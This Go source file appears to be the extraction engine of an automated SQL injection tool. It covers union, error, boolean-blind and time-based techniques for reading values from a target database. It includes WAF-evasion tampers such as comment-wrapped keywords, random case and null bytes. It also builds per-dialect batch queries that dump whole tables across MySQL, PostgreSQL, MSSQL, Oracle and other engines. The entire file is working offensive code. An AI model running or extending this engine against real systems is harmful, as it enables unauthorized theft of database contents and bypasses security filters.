package core

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Executor turns a scalar SQL expression into a value by using the technique
// that was confirmed for the current session.
type Executor struct {
	E       *Engine
	S       *Session
	Dialect *Dialect

	mu        sync.Mutex
	trueBody  string
	falseBody string
	baseline  time.Duration

	// raw disables payload transformation for the next request. It is used as
	// a fallback when a tamper chain breaks an otherwise working boundary.
	raw bool
}

func NewExecutor(e *Engine, s *Session) *Executor {
	d := GetDialect(s.DBMS)
	if d == nil {
		d = mysqlDialect()
	}
	return &Executor{E: e, S: s, Dialect: d}
}

func (x *Executor) ensureBaseline() {
	if x.baseline == 0 {
		x.baseline = x.E.baselineLatency(x.S.Point)
	}
}

// TransformFragment applies the operator's evasion chain to an injected SQL
// fragment. Encoding tampers are skipped here because the HTTP layer already
// encodes query and body values; applying them twice produces a literal string
// instead of SQL.
func (x *Executor) TransformFragment(fragment string) string {
	if x.raw || fragment == "" {
		return fragment
	}
	out := fragment
	for _, t := range x.E.Opts.Tamper {
		switch strings.ToLower(strings.TrimSpace(t)) {
		case "space2comment":
			out = strings.ReplaceAll(out, " ", "/**/")
		case "randomcase":
			out = randomCase(out)
		case "poly_comment":
			out = "/*!" + out + "*/"
		case "commentinjection":
			out = strings.ReplaceAll(out, " ", "/**/")
		case "nullbyte":
			out += "%00"
		}
	}
	if x.E.Opts.RandomCase {
		out = randomCase(out)
	}
	if x.E.Opts.BypassWAF {
		out = bypassInline(out)
	}
	return out
}

// bypassInline rewrites keywords that common WAF rules match literally.
func bypassInline(fragment string) string {
	replacer := strings.NewReplacer(
		" UNION ", "/*!50000UNION*/ ",
		" SELECT ", "/*!50000SELECT*/ ",
		" AND ", "/*!50000AND*/ ",
		" OR ", "/*!50000OR*/ ",
		" FROM ", "/*!50000FROM*/ ",
		" WHERE ", "/*!50000WHERE*/ ",
		" ORDER BY ", "/*!50000ORDER*/ /*!50000BY*/ ",
	)
	return replacer.Replace(fragment)
}

// Request injects a fragment using the confirmed boundary.
func (x *Executor) Request(fragment string) (string, int, error) {
	payload := x.S.Boundary.Prefix + x.TransformFragment(fragment) + x.S.Boundary.Suffix
	body, length, _, err := x.E.RequestAt(x.S.Point, payload)
	return body, length, err
}

var markerRE = regexp.MustCompile(`~([^~]*)~`)

func extractMarker(body string) string {
	matches := markerRE.FindAllStringSubmatch(body, -1)
	if len(matches) == 0 {
		return ""
	}
	// Prefer the longest match, which is usually the injected value.
	best := ""
	for _, m := range matches {
		if len(m) > 1 && len(m[1]) > len(best) {
			best = m[1]
		}
	}
	return decodeSeparators(best)
}

// decodeSeparators restores row and column separators that were escaped by a
// JSON response. HTML responses contain the control characters directly, so
// the replacement is a no-op for them.
func decodeSeparators(value string) string {
	replacer := strings.NewReplacer(
		`\u001e`, "\x1e",
		`\u001E`, "\x1e",
		`\u001f`, "\x1f",
		`\u001F`, "\x1f",
		`\x1e`, "\x1e",
		`\x1f`, "\x1f",
	)
	return replacer.Replace(value)
}

// scalarExpr makes a free-form SELECT usable as a scalar subquery. Without
// the parentheses, an expression such as "SELECT flag FROM secrets" cannot be
// concatenated into a marker expression.
func scalarExpr(expr string) string {
	expr = strings.TrimSpace(expr)
	if expr == "" {
		return expr
	}
	return "(" + expr + ")"
}

func (x *Executor) maxLength() int {
	n := x.E.Opts.MaxLength
	if n <= 0 {
		n = 4096
	}
	if n > 65535 {
		n = 65535
	}
	return n
}

// forcedTechnique returns the extraction technique requested by the operator.
func (x *Executor) forcedTechnique() string {
	forced := strings.ToLower(strings.TrimSpace(x.E.Opts.ExtractTechnique))
	if forced == "" || forced == "auto" {
		forced = strings.ToLower(strings.TrimSpace(x.E.Opts.Technique))
	}
	switch forced {
	case "blind":
		return "boolean"
	case "union", "error", "boolean", "time":
		return forced
	}
	return ""
}

// techniqueOrder returns the techniques to try, fastest first.
func (x *Executor) techniqueOrder() []string {
	if forced := x.forcedTechnique(); forced != "" {
		// The caller explicitly selected a technique. Do not silently use a
		// different one, because that changes the traffic profile.
		return []string{forced}
	}
	seen := map[string]bool{}
	var out []string
	add := func(t string) {
		if t == "" || seen[t] {
			return
		}
		seen[t] = true
		out = append(out, t)
	}
	if x.S.Columns > 0 && x.S.StringCol >= 0 {
		add("union")
	}
	add(x.S.Technique)
	add("union")
	add("error")
	add("boolean")
	add("time")
	return out
}

// Scalar extracts a single value from the target database.
func (x *Executor) Scalar(expr string) (string, error) {
	value, err := x.scalarOnce(expr, false)
	if err != nil {
		// A tamper chain can corrupt an otherwise valid boundary. Retry the
		// same techniques with the fragment untouched before giving up.
		if len(x.E.Opts.Tamper) > 0 || x.E.Opts.BypassWAF || x.E.Opts.RandomCase {
			x.raw = true
			defer func() { x.raw = false }()
			return x.scalarOnce(expr, true)
		}
	}
	return value, err
}

func (x *Executor) scalarOnce(expr string, retry bool) (string, error) {
	var lastErr error
	for _, technique := range x.techniqueOrder() {
		var value string
		var err error
		switch technique {
		case "union":
			value, err = x.unionScalar(expr)
		case "error":
			value, err = x.errorScalar(expr)
		case "boolean":
			value, err = x.booleanScalar(expr)
		case "time":
			value, err = x.timeScalar(expr)
		default:
			continue
		}
		if err == nil && value != "" {
			if x.S.Technique != technique {
				x.S.Technique = technique
			}
			return value, nil
		}
		if err != nil {
			lastErr = err
		} else if value == "" {
			// An empty scalar is a legitimate result (for example a table
			// with no matching rows). Report it instead of cascading.
			return "", nil
		}
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no extraction technique succeeded")
	}
	if retry {
		return "", lastErr
	}
	return "", lastErr
}

// ScalarVia forces one technique. It is used by deep extraction to avoid
// re-probing the technique order for every single value.
func (x *Executor) ScalarVia(technique, expr string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(technique)) {
	case "union":
		return x.unionScalar(expr)
	case "error":
		return x.errorScalar(expr)
	case "boolean", "blind":
		return x.booleanScalar(expr)
	case "time":
		return x.timeScalar(expr)
	}
	return x.Scalar(expr)
}

// Strings extracts a list of values. The SQL expression must aggregate rows
// with the dialect row separator (char 30).
func (x *Executor) Strings(expr string) ([]string, error) {
	value, err := x.Scalar(expr)
	if err != nil {
		return nil, err
	}
	return splitRowValues(value), nil
}

func splitRowValues(value string) []string {
	value = strings.ReplaceAll(value, "\x1e", "\n")
	parts := strings.Split(value, "\n")
	out := make([]string, 0, len(parts))
	seen := map[string]bool{}
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			continue
		}
		seen[p] = true
		out = append(out, p)
	}
	return out
}

func (x *Executor) ensureUnion() error {
	if x.S.Columns > 0 && x.S.StringCol >= 0 {
		return nil
	}
	cols, col, ok := x.E.DetectUnionColumns(x.S)
	if !ok {
		return fmt.Errorf("union column detection failed")
	}
	x.S.Columns = cols
	x.S.StringCol = col
	return nil
}

func (x *Executor) unionScalar(expr string) (string, error) {
	if err := x.ensureUnion(); err != nil {
		return "", err
	}
	if x.S.StringCol < 0 {
		return "", fmt.Errorf("no string-compatible union column")
	}

	marked := x.Dialect.Marker(scalarExpr(expr))
	nulls := make([]string, x.S.Columns)
	for i := range nulls {
		nulls[i] = "NULL"
	}
	nulls[x.S.StringCol] = marked
	fragment := " UNION SELECT " + strings.Join(nulls, ",")
	body, _, err := x.Request(fragment)
	if err != nil {
		return "", err
	}
	if value := extractMarker(body); value != "" {
		return value, nil
	}
	return "", fmt.Errorf("union marker not found in response")
}

func (x *Executor) errorScalar(expr string) (string, error) {
	errExpr, ok := x.Dialect.ErrorExpr(scalarExpr(expr))
	if !ok {
		return "", fmt.Errorf("error-based extraction not supported for %s", x.Dialect.Name)
	}
	body, _, err := x.Request(" AND " + errExpr)
	if err != nil {
		return "", err
	}
	if value := extractMarker(body); value != "" {
		return value, nil
	}
	return "", fmt.Errorf("error marker not found in response")
}

func (x *Executor) booleanScalar(expr string) (string, error) {
	length, err := x.blindLength(expr)
	if err != nil {
		return "", err
	}
	limit := x.maxLength()
	if length <= 0 {
		return "", nil
	}
	if length > limit {
		length = limit
	}
	var builder strings.Builder
	for pos := 1; pos <= length; pos++ {
		ch, err := x.blindChar(expr, pos)
		if err != nil {
			return builder.String(), err
		}
		if ch == 0 {
			break
		}
		builder.WriteByte(byte(ch))
	}
	return builder.String(), nil
}

func (x *Executor) timeScalar(expr string) (string, error) {
	length, err := x.timeLength(expr)
	if err != nil {
		return "", err
	}
	limit := x.maxLength()
	if length <= 0 {
		return "", nil
	}
	if length > limit {
		length = limit
	}
	var builder strings.Builder
	for pos := 1; pos <= length; pos++ {
		ch, err := x.timeChar(expr, pos)
		if err != nil {
			return builder.String(), err
		}
		if ch == 0 {
			break
		}
		builder.WriteByte(byte(ch))
	}
	return builder.String(), nil
}

func (x *Executor) blindLength(expr string) (int, error) {
	lengthExpr := x.Dialect.Length(scalarExpr(expr))
	return x.binarySearch(0, x.maxLength(), func(mid int) bool {
		return x.booleanOracle(lengthExpr + " >= " + strconv.Itoa(mid))
	})
}

func (x *Executor) blindChar(expr string, pos int) (int, error) {
	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
	ascii := x.Dialect.ASCII(sub)
	// Start at 0: control characters (row and column separators) are part of
	// every aggregated value, and a lower bound of 31 silently rewrote them.
	return x.binarySearch(0, 127, func(mid int) bool {
		return x.booleanOracle(ascii + " >= " + strconv.Itoa(mid))
	})
}

func (x *Executor) timeLength(expr string) (int, error) {
	lengthExpr := x.Dialect.Length(scalarExpr(expr))
	return x.binarySearch(0, x.maxLength(), func(mid int) bool {
		return x.timeOracle(lengthExpr + " >= " + strconv.Itoa(mid))
	})
}

func (x *Executor) timeChar(expr string, pos int) (int, error) {
	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
	ascii := x.Dialect.ASCII(sub)
	return x.binarySearch(0, 127, func(mid int) bool {
		return x.timeOracle(ascii + " >= " + strconv.Itoa(mid))
	})
}

// binarySearch finds the largest value for which predicate is true. The
// predicate is expected to be monotonic, which is the case for length and
// ASCII comparisons.
func (x *Executor) binarySearch(low, high int, predicate func(int) bool) (int, error) {
	result := low
	for low <= high {
		mid := (low + high) / 2
		if predicate(mid) {
			result = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
	}
	return result, nil
}

// booleanOracle evaluates a condition by comparing its response with known
// true and false reference responses.
func (x *Executor) booleanOracle(cond string) bool {
	x.mu.Lock()
	if x.trueBody == "" || x.falseBody == "" {
		x.trueBody = x.booleanRequest(" AND 1=1")
		x.falseBody = x.booleanRequest(" AND 1=2")
	}
	trueBody, falseBody := x.trueBody, x.falseBody
	x.mu.Unlock()

	if trueBody == "" || falseBody == "" || !responsesDiffer(trueBody, falseBody) {
		return false
	}
	body := x.booleanRequest(" AND (" + cond + ")")
	if body == "" {
		return false
	}
	return responsesSimilar(body, trueBody) && responsesDiffer(body, falseBody)
}

func (x *Executor) booleanRequest(fragment string) string {
	body, _, err := x.Request(fragment)
	if err != nil {
		return ""
	}
	return body
}

// timeOracle samples the delay once and repeats only when the first sample is
// inconclusive. A positive delay is a strong signal; a missing one is common
// under jitter, so a single retry balances accuracy and request count.
func (x *Executor) timeOracle(cond string) bool {
	x.ensureBaseline()
	delay := x.E.Opts.TimeSecs
	if delay <= 0 {
		delay = 3
	}
	payload := x.timePayload(cond, delay)
	threshold := x.baseline + delayThreshold(delay)
	for attempt := 0; attempt < 2; attempt++ {
		_, _, _, err := x.E.RequestAt(x.S.Point, payload)
		if err != nil {
			continue
		}
		if x.E.LastResponseTime > threshold {
			return true
		}
	}
	return false
}

// delayThreshold returns the minimum extra latency that counts as a delayed
// response.
func delayThreshold(delay int) time.Duration {
	threshold := time.Duration(delay) * time.Second * 7 / 10
	if threshold < 700*time.Millisecond {
		threshold = 700 * time.Millisecond
	}
	return threshold
}

func (x *Executor) timePayload(cond string, delay int) string {
	switch strings.ToLower(x.Dialect.Name) {
	case "mssql", "sybase":
		return x.S.Boundary.Prefix + "; IF (" + cond + ") WAITFOR DELAY '0:0:" + fmt.Sprintf("%d", delay) + "'" + x.S.Boundary.Suffix
	default:
		return x.S.Boundary.Prefix + " AND " + x.Dialect.TimeCondition(cond, delay) + x.S.Boundary.Suffix
	}
}

// SQLQuery runs a free-form scalar SQL expression and returns the result.
func (x *Executor) SQLQuery(query string) (string, error) {
	return x.Scalar(query)
}

// --- batched row extraction ---------------------------------------------

// DumpRowsExpression builds a scalar aggregation that returns count rows in a
// single request. Rows are separated by char(30), columns by char(31). It
// returns false when the dialect has no portable aggregation form, in which
// case the caller falls back to one row per request.
func (x *Executor) DumpRowsExpression(ref TableRef, cols []string, offset, count int, where string) (string, bool) {
	if len(cols) == 0 || count <= 0 {
		return "", false
	}
	table := x.tableFor(ref)
	whereSQL := whereClause(where)
	concatRow := func(sep string) string {
		parts := make([]string, 0, len(cols))
		for _, c := range cols {
			parts = append(parts, x.columnText(ref, c))
		}
		return joinExpr(parts, sep, x.dialectPipes())
	}

	switch strings.ToLower(x.Dialect.Name) {
	case "mysql":
		row := fmt.Sprintf("CONCAT_WS(0x1f,%s)", strings.Join(mysqlColumnExprs(cols), ","))
		return fmt.Sprintf("(SELECT GROUP_CONCAT(r SEPARATOR 0x1e) FROM (SELECT %s AS r FROM %s%s LIMIT %d,%d) hackit_batch)", row, table, whereSQL, offset, count), true
	case "postgresql", "cockroachdb", "duckdb", "redshift", "yugabytedb":
		row := joinExpr(pgColumnExprs(cols), "chr(31)", true)
		return fmt.Sprintf("(SELECT string_agg(r,chr(30)) FROM (SELECT %s AS r FROM %s%s LIMIT %d OFFSET %d) hackit_batch)", row, table, whereSQL, count, offset), true
	case "mssql":
		row := joinExpr(mssqlColumnExprs(cols), "CHAR(31)", false)
		return fmt.Sprintf("(SELECT STRING_AGG(r,CHAR(30)) FROM (SELECT %s AS r FROM %s%s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT %d ROWS ONLY) hackit_batch)", row, table, whereSQL, offset, count), true
	case "oracle":
		row := joinExpr(oracleColumnExprs(cols), "CHR(31)", true)
		return fmt.Sprintf("(SELECT LISTAGG(r,CHR(30)) WITHIN GROUP (ORDER BY ROWNUM) FROM (SELECT %s AS r FROM %s%s OFFSET %d ROWS FETCH NEXT %d ROWS ONLY) hackit_batch)", row, table, whereSQL, offset, count), true
	case "sqlite":
		row := joinExpr(sqliteColumnExprs(cols), "char(31)", true)
		return fmt.Sprintf("(SELECT GROUP_CONCAT(r,char(30)) FROM (SELECT %s AS r FROM %s%s LIMIT %d OFFSET %d) hackit_batch)", row, table, whereSQL, count, offset), true
	case "db2":
		row := joinExpr(db2ColumnExprs(cols), "CHR(31)", true)
		return fmt.Sprintf("(SELECT LISTAGG(r,CHR(30)) WITHIN GROUP (ORDER BY ROWNUM) FROM (SELECT %s AS r FROM %s%s ORDER BY 1 OFFSET %d ROWS FETCH NEXT %d ROWS ONLY) hackit_batch)", row, table, whereSQL, offset, count), true
	case "snowflake":
		row := joinExpr(snowflakeColumnExprs(cols), "CHAR(31)", false)
		return fmt.Sprintf("(SELECT LISTAGG(r,CHAR(30)) WITHIN GROUP (ORDER BY SEQ4()) FROM (SELECT %s AS r FROM %s%s LIMIT %d OFFSET %d) hackit_batch)", row, table, whereSQL, count, offset), true
	case "clickhouse":
		row := joinExpr(clickhouseColumnExprs(cols), "char(31)", false)
		return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(r),char(30)) FROM (SELECT %s AS r FROM %s%s LIMIT %d OFFSET %d))", row, table, whereSQL, count, offset), true
	default:
		// Generic fallback: aggregate the single-row expression through a
		// derived table. Works on engines with standard LISTAGG/STRING_AGG.
		row := concatRow("'|'")
		return fmt.Sprintf("(SELECT STRING_AGG(r,CHAR(30)) FROM (SELECT %s AS r FROM %s%s LIMIT %d OFFSET %d) hackit_batch)", row, table, whereSQL, count, offset), false
	}
}

func (x *Executor) dialectPipes() bool {
	switch strings.ToLower(x.Dialect.Name) {
	case "mysql", "mssql", "snowflake", "clickhouse", "bigquery":
		return false
	}
	return true
}

func (x *Executor) tableFor(ref TableRef) string {
	switch strings.ToLower(x.Dialect.Name) {
	case "mysql":
		return mysqlTable(ref)
	case "postgresql", "cockroachdb", "duckdb", "redshift", "yugabytedb":
		return pgTable(ref)
	case "mssql", "azure sql":
		return mssqlTable(ref)
	case "oracle":
		return oracleTable(ref)
	case "sqlite":
		return quoteDouble(ref.Table)
	case "db2":
		return db2Table(ref)
	case "snowflake":
		return snowflakeTable(ref)
	case "clickhouse":
		return clickhouseTable(ref)
	case "bigquery":
		return bigqueryTable(ref)
	case "h2":
		return h2Table(ref)
	case "firebird":
		return firebirdTable(ref)
	case "sybase":
		return sybaseTable(ref)
	default:
		return x.Dialect.Quote(ref.Table)
	}
}

func (x *Executor) columnText(ref TableRef, col string) string {
	q := x.Dialect.Quote(col)
	switch strings.ToLower(x.Dialect.Name) {
	case "mysql":
		return fmt.Sprintf("IFNULL(CAST(%s AS CHAR),'NULL')", quoteBacktick(col))
	case "mssql":
		return fmt.Sprintf("ISNULL(CAST(%s AS NVARCHAR(MAX)),'NULL')", quoteBracket(col))
	case "oracle":
		return fmt.Sprintf("NVL(TO_CHAR(%s),'NULL')", quoteDouble(strings.ToUpper(col)))
	case "sqlite":
		return fmt.Sprintf("COALESCE(CAST(%s AS TEXT),'NULL')", q)
	case "clickhouse":
		return fmt.Sprintf("ifNull(toString(%s),'NULL')", quoteBacktick(col))
	case "snowflake":
		return fmt.Sprintf("COALESCE(TO_VARCHAR(%s),'NULL')", q)
	case "db2":
		return fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(32000)),'NULL')", q)
	default:
		return fmt.Sprintf("COALESCE(CAST(%s AS TEXT),'NULL')", q)
	}
}

func mysqlColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("IFNULL(CAST(%s AS CHAR),'NULL')", quoteBacktick(c)))
	}
	return out
}

func pgColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("COALESCE(%s::text,'NULL')", quoteDouble(c)))
	}
	return out
}

func mssqlColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("ISNULL(CAST(%s AS NVARCHAR(MAX)),'NULL')", quoteBracket(c)))
	}
	return out
}

func oracleColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("NVL(TO_CHAR(%s),'NULL')", quoteDouble(strings.ToUpper(c))))
	}
	return out
}

func sqliteColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("COALESCE(CAST(%s AS TEXT),'NULL')", quoteDouble(c)))
	}
	return out
}

func db2ColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(32000)),'NULL')", quoteDouble(c)))
	}
	return out
}

func snowflakeColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("COALESCE(TO_VARCHAR(%s),'NULL')", quoteDouble(c)))
	}
	return out
}

func clickhouseColumnExprs(cols []string) []string {
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, fmt.Sprintf("ifNull(toString(%s),'NULL')", quoteBacktick(c)))
	}
	return out
}

// DumpBatch extracts up to count rows in one request when the dialect supports
// aggregation and falls back to one request per row otherwise.
func (x *Executor) DumpBatch(ref TableRef, cols []string, offset, count int, where string) ([][]string, error) {
	if count <= 0 {
		count = 1
	}
	if expr, ok := x.DumpRowsExpression(ref, cols, offset, count, where); ok {
		value, err := x.Scalar(expr)
		if err == nil && value != "" {
			rows := splitBatchRows(value, len(cols))
			if len(rows) > 0 {
				return rows, nil
			}
		}
	}
	var rows [][]string
	for i := 0; i < count; i++ {
		expr := x.Dialect.DumpRow(ref, cols, offset+i, where)
		value, err := x.Scalar(expr)
		if err != nil || value == "" {
			break
		}
		parts := strings.Split(value, "\x1f")
		if len(parts) == 1 && parts[0] == "" {
			break
		}
		rows = append(rows, parts)
	}
	return rows, nil
}

// splitBatchRows keeps only complete rows. A truncated aggregation leaves a
// partial trailing row, which is discarded so the caller can resume cleanly.
func splitBatchRows(value string, width int) [][]string {
	var rows [][]string
	for _, raw := range strings.Split(value, "\x1e") {
		if raw == "" {
			continue
		}
		parts := strings.Split(raw, "\x1f")
		if width > 0 && len(parts) != width {
			continue
		}
		rows = append(rows, parts)
	}
	return rows
}
